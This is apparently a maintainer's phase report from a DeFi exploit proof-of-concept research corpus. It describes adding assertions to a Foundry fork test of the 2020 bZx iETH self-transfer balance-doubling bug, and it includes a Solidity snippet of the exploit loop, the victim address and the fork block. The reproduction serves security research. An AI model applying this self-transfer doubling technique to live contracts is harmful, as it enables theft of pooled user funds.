# Phase 6F: bZx iETH Self-Transfer Assertion Patch

**Phase:** 6F — Apply additive assertion patch to one PoC only
**Branch:** `arkheionx/research-grade-rebuild`
**Maintainer:** Yudistira Putra (arkheionx)
**Date:** 2026-05-22
**Target entry:** `2020-09-bzx-ifusdc` (id slug retained from Phase 6A;
code-observed protocol is **bZx iETH self-transfer double-write**, not
iUSDC/LINK)

---

## 1. Summary

- One PoC patched this phase: `EVM/test/2020-09/Exploit_2020-09.t.sol`.
- Additive-only changes: captured two return values that were already
  produced by the existing exploit calls, added a per-iteration
  `assertEq` inside the existing 4-iteration self-transfer loop, added
  a final `assertEq` and a single `assertGt` on the redeemed amount.
- Exploit flow is **unchanged**: same victim/token addresses, same
  loop count (4), same transfer amount (`balance`), same call ordering,
  same fork block (`10852715`), same simulated 200 ether flash-loan
  framing, same `payable(0).transfer(200 ether)` flash-loan repayment.
- `forge build` is clean; `forge fmt --check` is clean.
- `forge test` could not execute the assertion logic because the
  configured public RPC pruned state at block 10852715 — classified as
  an **RPC limitation, not a PoC failure**.
- Metadata: `assertion_quality` raised `weak` → `strong` on static
  grounds; `verification_status` retained `not-run-no-rpc`;
  `reproducibility` retained `deterministic-likely-but-unverified`;
  `tags` extended with `phase-6f-asserted`.
- Deterministic-confirmed count remains **0** for the corpus.

---

## 2. File Modified

`EVM/test/2020-09/Exploit_2020-09.t.sol` — only file touched in
`EVM/`. No changes to `EVM/src/**`, no changes to any other
`EVM/test/**` file, no changes to `web/**`, `SVM/**`, or `MoveVM/**`.

Identity reminder: the on-disk path and metadata `id`
(`2020-09-bzx-ifusdc`) are preserved as Phase 6A required for stability,
but the code-observed protocol is the bZx **iETH** market
(`loanToken = 0xB983E01458529665007fF7E0CDdeCDB74B967Eb6`,
`ILoanTokenLogicWeth`), not iUSDC. This patch is consistent with the
iETH market only.

---

## 3. Assertions Added

All additions are read-only (`balanceOf`) plus Foundry assertion calls
plus return-value capture from existing exploit calls. No new external
state mutations were introduced.

```solidity
// existing: vm.deal(this, 200 ether)
uint256 mintAmount = loanToken.mintWithEther{value: 200 ether}(address(this));

// F6 — per-iteration doubling fingerprint
uint256 expected = mintAmount;
for (int256 i = 0; i < 4; i++) {
    uint256 balance = loanToken.balanceOf(address(this));
    assertEq(balance, expected,
        "iETH balance must equal expected pre-doubling value");
    loanToken.transfer(address(this), balance); // unchanged exploit step
    expected = expected * 2;
}

uint256 finalIETH = loanToken.balanceOf(address(this));
assertEq(finalIETH, mintAmount * 16,
    "final iETH must equal 2**4 * mintAmount");

// F1 — attacker profit lower bound
uint256 redeemed = loanToken.burnToEther(address(this), finalIETH);
assertGt(redeemed, 200 ether,
    "burnToEther must return more than the 200 ether principal");

// existing: payable(address(0x0)).transfer(200 ether)
```

What changed vs the pre-patch test:

- `mintWithEther` return value is now captured (`mintAmount`); was
  previously discarded.
- Inside the existing loop, the pre-call `balanceOf` read is reused as
  the assertion subject — no extra `balanceOf` call per iteration.
- After the loop, one extra `balanceOf` read (`finalIETH`) feeds both
  the final equality assertion and the existing `burnToEther` call.
- `burnToEther` return value is now captured (`redeemed`); was
  previously discarded.
- Two short comments mark the F6 and F1 proof targets.

What did **not** change:

- Loop count (4).
- Self-transfer call: `loanToken.transfer(address(this), balance)`.
- Transfer amount (`balance`).
- Call ordering: deal → mint → loop(transfer) → burn → simulated repay.
- Fork block (`10852715`) and RPC alias (`mainnet`).
- Victim/token addresses (`loanToken = 0xB983E014...`).
- The `payable(0).transfer(200 ether)` flash-loan repayment line.
- The `balanceLog` modifier on `testExploit`.

---

## 4. Proof Targets

- **F6 — accounting mismatch.** The per-iteration equality
  `balanceOf == expected` together with `expected *= 2` is the
  canonical fingerprint of the `_internalTransferFrom`
  source/destination overwrite: when `src == dst`, the destination
  write overwrites the source decrement, doubling the holder's
  balance. Each iteration's check is an exact equality against a
  derived literal (`mintAmount * 2**i`), so the assertion can only
  pass if the doubling actually happens.
- **F1 — attacker profit lower bound.** `assertGt(redeemed, 200 ether)`
  is a strict-inequality lower bound against the simulated flash-loan
  principal. The exact margin depends on iETH NAV at the fork block,
  so a strict equality would be unsafe; the strict inequality cannot
  pass without the doubling bug increasing the redeemable principal.

False-positive surface for the equalities is zero. False-positive
surface for the lower bound is bounded by NAV growth between mint and
burn within a single block, which on a single transaction is
negligible relative to the 16× balance inflation the bug produces.

---

## 5. Commands Run

All commands run from repository root (`/home/arkheionx/Documents/DeFi-Exploit-PoCs`)
unless noted.

| Command | Result |
|---|---|
| `git status --short` | only the four expected files modified after patch (test, registry, quality matrix, verification report) |
| `python3 scripts/validate_metadata.py` | `ok: 18 entries valid` |
| `python3 scripts/generate_registry.py --check` | `ok: 18 entries` |
| `python3 scripts/score_pocs.py --check` | `ok: matrix unchanged (18 entries)` (pre-patch) |
| `python3 scripts/score_pocs.py` | `updated: reports/poc_quality_matrix.md (18 entries)` (post-patch) |
| `python3 scripts/generate_verification_report.py --check` | `ok: 18 entries processed, 0 changed` (after regeneration) |
| `python3 scripts/generate_verification_report.py` | `updated: reports/verification/2020-09-bzx-ifusdc.md` |
| `cd EVM && forge fmt --check` | clean (exit 0) |
| `cd EVM && forge fmt --check test/2020-09/Exploit_2020-09.t.sol` | clean (exit 0) |
| `cd EVM && forge build` | `Compiler run successful with warnings` (lint warnings only, no compile errors) |
| `cd EVM && forge test --match-path test/2020-09/Exploit_2020-09.t.sol -vvv` | `setUp()` reverted in `vm.createSelectFork("mainnet", 10852715)`: `historical state ... is not available` from public RPC |

---

## 6. Fork Test Result

```
Ran 1 test for test/2020-09/Exploit_2020-09.t.sol:Exploit__202009
[FAIL: vm.createSelectFork: failed to get account for
0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38: server returned an error
response: error code -32000: historical state
0c7b399c2007bc65b9ebb437b895286cde03c72c3f76439b1931728f08a89b1a is
not available] setUp() (gas: 0)
Suite result: FAILED. 0 passed; 1 failed; 0 skipped
```

Classification: **RPC limitation, not a PoC failure.** The test
reverted in `setUp` before any test body ran, so none of the new
assertions were exercised. Public mainnet RPC providers prune state
older than ~128 blocks; block 10852715 (Sep 2020) is several years
beyond that horizon.

Per task rules:

- The patch is **not** marked deterministic-confirmed.
- `verification_status` is **not** promoted to `verified`.
- The PoC is recorded as `requires-archival-rpc` for end-to-end
  verification.
- The patch is retained because it compiles, is forge-fmt-clean, and
  is logically correct against the existing exploit flow.

---

## 7. Metadata Changes

Single entry mutated: `2020-09-bzx-ifusdc` in `metadata/registry.json`.

| Field | Before | After |
|---|---|---|
| `assertion_quality` | `weak` | `strong` |
| `verification_status` | `not-run-no-rpc` | `not-run-no-rpc` (unchanged) |
| `reproducibility` | `deterministic-likely-but-unverified` | `deterministic-likely-but-unverified` (unchanged) |
| `notes` | Phase 6A text only | Phase 6A text + Phase 6F appendix describing assertions, build/fmt result, and RPC-limited test result |
| `tags` | `["phase-6a-reclassified"]` | `["phase-6a-reclassified", "phase-6f-asserted"]` |

Phase 6A reclassification text (id slug retention, iETH market
identification, `loss_usd` removal rationale) is preserved verbatim.

Generated artifacts that updated mechanically as a result:

- `reports/poc_quality_matrix.md` — score table reflects the new
  `assertion_quality: strong` row.
- `reports/verification/2020-09-bzx-ifusdc.md` — generated section
  reflects `assertion_quality: strong`; manual sections (Phase 6B
  plan, Phase 6A reclassification, new **Phase 6F Assertion Patch**
  section) preserved outside the BEGIN/END markers.

---

## 8. Verified Count After This Phase

- **Deterministic-confirmed PoCs in the corpus:** 0 (unchanged).
- **PoCs with `assertion_quality: strong`:** increased by 1 to include
  `2020-09-bzx-ifusdc` (full count includes prior-phase strong
  entries: 2017-07 Parity, 2017-11 Parity (Phase 6C), 2018-04 BEC
  (Phase 6D), 2020-06 Bancor (Phase 6E), 2020-09 bZx iETH (this
  phase), and other already-strong corpus entries).
- **PoCs awaiting archival RPC for end-to-end verification:** the
  Phase 6 patched set (2017-11, 2018-04, 2020-06, 2020-09) all remain
  in `not-run-no-rpc` because public RPC cannot serve their fork
  blocks. This is consistent across phases and is documented per-PoC.

The corpus has not gained any deterministic-confirmed PoC in this
phase. The improvement is **proof-quality only**.

---

## 9. Risks and Caveats

- **Unverified by execution.** No assertion in the patch has been
  observed to pass against historical state. The compile-time and
  static-correctness reasoning is sound, but the only ground truth
  for `deterministic-confirmed` is an archival-fork run.
- **NAV-dependent lower bound.** `assertGt(redeemed, 200 ether)` is
  conservative against the historical figure but technically
  NAV-sensitive at the fork block. If iETH NAV at block 10852715 had
  somehow contracted by more than 6.25% (1/16) within the same
  transaction, the assertion could understate the bug. This is not
  physically possible inside one transaction; the lower bound stands.
- **Identity slug.** The `id` `2020-09-bzx-ifusdc` is a Phase 6A
  legacy. Future readers must consult Phase 6A and the Phase 6F
  identity reminder block to confirm the iETH-vs-iUSDC scope. The
  registry `summary`, `title`, `attacker_path`, and the Phase 6F
  notes all anchor on iETH.
- **Forge lint warnings only.** `forge build` reports lint warnings
  (`erc20-unchecked-transfer`, `unsafe-typecast`) on **other**
  test files (e.g. `test/2025-11/Exploit_2025-11.t.sol`), not on the
  patched 2020-09 file. The patched file produces no new warnings.

---

## 10. Recommendation for Next One-PoC Patch

The next priority remaining from the Phase 6B plan is rank 5:

- **`2020-12-warp-finance` — Cover Protocol Blacksmith infinite mint**
  (`EVM/test/2020-12/Exploit_2020-12.t.sol`, fork block `11542309`).

Rationale:

- It is the last unpatched entry on the Phase 6B priority list.
- The proposed assertions are conservative: a `> 1 COVER` floor on
  the depositor delta plus a `totalSupply` equality check tying the
  mint to the depositor delta. Neither encodes a precise loss claim;
  both are zero or near-zero false-positive.
- Same archival-RPC posture as the other Phase 6 patches — the
  patch will land but cannot be promoted to
  `deterministic-confirmed` without archival mainnet at block
  11542309.
- Patch class (per Phase 6B): additive-only but requires archival
  verification.

Per the one-PoC-per-phase rule, **do not start that patch in this
phase.** Phase 6G (or whichever sub-phase the maintainer schedules
next) should be the single change: add the Cover snippet from Phase
6B section 4.5 verbatim, run the Phase 6B section 7 validation suite,
update metadata `assertion_quality` accordingly, and stop.

After Phase 6G lands, the Phase 6B priority list is fully patched and
Phase 7 (re-run static review on patched files) becomes the recommended
next phase, gated on archival-RPC procurement before any
`verification_status: verified` promotion is attempted.

---

## 11. Sign-off

This phase is additive-only with respect to test logic, scoped to a
single PoC, and produced no `verified` claims and no
`deterministic-confirmed` promotions. The patch is safe to revert
cleanly because no other test or source file was touched.
